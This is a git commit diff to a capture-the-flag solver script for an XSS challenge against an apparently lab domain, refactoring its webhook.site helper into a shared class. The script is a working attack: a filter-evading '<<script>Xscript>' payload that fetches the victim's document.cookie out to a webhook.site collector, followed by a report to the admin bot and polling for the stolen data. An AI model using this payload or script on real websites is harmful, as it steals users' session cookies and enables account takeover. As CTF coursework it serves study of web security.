d91dbeda912c82ff4f3da16d7f26e2730390cbea
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-10 16:47:25 +1000

    Clients 1 - Use WebhookSite

--- ctf/4-XSS/clients_1.py
+++ ctf/4-XSS/clients_1.py
@@ -1,27 +1,14 @@
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
-from utils import get_session, find_flag
+from utils import get_session, find_flag, WebhookSite
 
 from bs4 import BeautifulSoup
 
 class Solver:
     def __init__(self):
         self.session = get_session()
-        self.webhooksite_uuid = self.session.post("https://webhook.site/token").json()["uuid"]
-        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
-        self.webhooksite_view_url = f"https://webhook.site/#!/view/{self.webhooksite_uuid}"
-        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
-
-    def find_flag_webhooksite(self, max_attempts=3, delay_seconds=1):
-        import time, json
-        for _ in range(max_attempts):
-            time.sleep(delay_seconds)
-            response = self.session.get(self.webhooksite_requests_url)
-            response_json = response.json()
-            if response_json["data"]:
-                response_json_text = json.dumps(response_json, indent=2)
-                return find_flag(response_json_text)
+        self.webhooksite = WebhookSite()
 
     def generate_random_string(self, length = 10):
         import random, string
@@ -29,7 +16,7 @@ class Solver:
 
     def main(self):
         BASE_URL = "https://clients.quoccacorp.com"
-        PAYLOAD = f'''<<script>Xscript>fetch(`{self.webhooksite_url}?q=${{document.cookie}}`);</script>'''
+        PAYLOAD = f'''<<script>Xscript>fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);</script>'''
 
         random_string = self.generate_random_string()
         new_user_data = {
@@ -67,7 +54,7 @@ class Solver:
 
         # Report Home Page to Admin
         self.session.post(f"{BASE_URL}/report")
-        self.find_flag_webhooksite()
+        self.webhooksite.find_flag()
 
 if __name__ == "__main__":
     Solver().main()
